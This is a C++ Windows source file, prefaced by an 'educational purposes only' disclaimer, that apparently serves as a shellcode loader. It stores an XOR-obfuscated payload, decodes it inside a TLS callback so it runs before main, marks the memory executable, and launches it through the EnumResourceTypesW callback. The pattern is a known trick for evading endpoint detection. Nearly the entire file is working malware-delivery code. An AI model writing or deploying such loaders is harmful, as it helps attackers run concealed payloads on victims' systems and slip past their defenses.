/*
 * Disclaimer:
 * This code was created for educational purposes only.
 * The author does not take responsibility for any misuse
 * or unintended consequences arising from its application.
 * Users are encouraged to exercise caution and adhere to
 * all relevant laws and regulations when utilizing this code.
 */

#include <windows.h>
#include <stdio.h>

#pragma comment(linker, "/include:_tls_used")
#pragma comment(linker, "/include:_tls_callback_func")

extern "C" void NTAPI TlsCallBck(
    PVOID DllHandle,
    DWORD Reason,
    PVOID Reserved
)
{
    int key = 0x99;    
    const UCHAR sc[] = {
        0xd1, 0xa8, 0x66, 0xd1, 0x6e, 0x7e, 0xfc, 0xd1,
        0x12, 0xc1, 0xf9, 0xd1, 0x12, 0xc2, 0x81, 0xd1,
        0x12, 0xc2, 0xb9, 0xd1, 0x12, 0x82, 0xd1, 0x12,
        0x82, 0xd1, 0x12, 0xc2, 0xb9, 0xd0, 0x10, 0x41,
        0x12, 0xc2, 0xa5, 0xd5, 0x98, 0x5a, 0xd1, 0xa8,
        0x50, 0xff, 0x18, 0x58, 0x66, 0x11, 0xd1, 0x58,
        0x70, 0x91, 0x12, 0x8d, 0x92, 0xd5, 0x98, 0x5b,
        0xd4, 0xa8, 0x4b, 0xdd, 0x12, 0xcb, 0x85, 0xd4,
        0x98, 0x5b, 0xd4, 0xa8, 0x42, 0xdd, 0x12, 0xc3,
        0xb9, 0xd4, 0x98, 0x5a, 0xd4, 0xa8, 0x7d, 0xdd,
        0x12, 0xfb, 0xbd, 0xd4, 0x98, 0x5d, 0x72, 0xab,
        0xc2, 0xc0, 0xd1, 0xa8, 0x59, 0xd1, 0x10, 0x7b,
        0xc8, 0xd1, 0x12, 0x95, 0xbd, 0xd1, 0xa8, 0x66,
        0xd8, 0x12, 0xa5, 0x1a, 0xd5, 0x98, 0x5e, 0xd1,
        0x10, 0x4f, 0x6a, 0x3f, 0xed, 0x9c, 0xd1, 0x66,
        0x59, 0x72, 0x7f, 0xc0, 0xff, 0xd8, 0x12, 0x9d,
        0xdd, 0xd8, 0x12, 0x9d, 0x1b, 0xd5, 0x98, 0x59,
        0xca, 0x5a, 0xd1, 0xa8, 0x50, 0x19, 0x58, 0x9e,
        0xd1, 0x21, 0x96, 0x31, 0x0f, 0x08, 0x23, 0x1e,
        0x03, 0x05, 0xd1, 0x6e, 0x49, 0xd1, 0x58, 0x71,
        0x91, 0xc9, 0xc8, 0x71, 0x29, 0x66, 0x66, 0x66,
        0xd0, 0x10, 0x5f, 0xd1, 0xa8, 0x50, 0xd1, 0x6e,
        0x78, 0xc9, 0xd1, 0x21, 0x05, 0x07, 0x0a, 0x05,
        0x48, 0x03, 0x1e, 0x03, 0xd1, 0x6e, 0x49, 0xc9,
        0xd1, 0x10, 0x78, 0xd1, 0x66, 0x5b, 0xd1, 0x1a,
        0x75, 0xb9, 0xd8, 0x66, 0x4f
    };

    LPVOID NewMem = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NewMem == NULL)
    {
        printf("Error allocating mem.\n");
    }

    UCHAR dec[sizeof(sc)];

    for (int i = 0; i < sizeof(sc); i++)
    {
        dec[i] = sc[i] ^ key;
    }

    memcpy(NewMem, dec, sizeof(dec));

    DWORD OldProtect = 0;
    BOOL MemPermission = VirtualProtect(LPVOID(NewMem), sizeof(dec), PAGE_EXECUTE_READ, &OldProtect);
    if (!MemPermission)
    {
        printf("Error modifying memory permission:%d", GetLastError());
    }
      
    BOOL CbckFun = EnumResourceTypesW(0, (ENUMRESTYPEPROC)NewMem, 0);
    
}

#pragma const_seg(".CRT$XLB")
extern "C" const PIMAGE_TLS_CALLBACK _tls_callback_func = TlsCallBck;
#pragma const_seg()

int main()
{
	printf("Shellcode decrypted and executed from TLS Callback Function\n");
	return 0;
}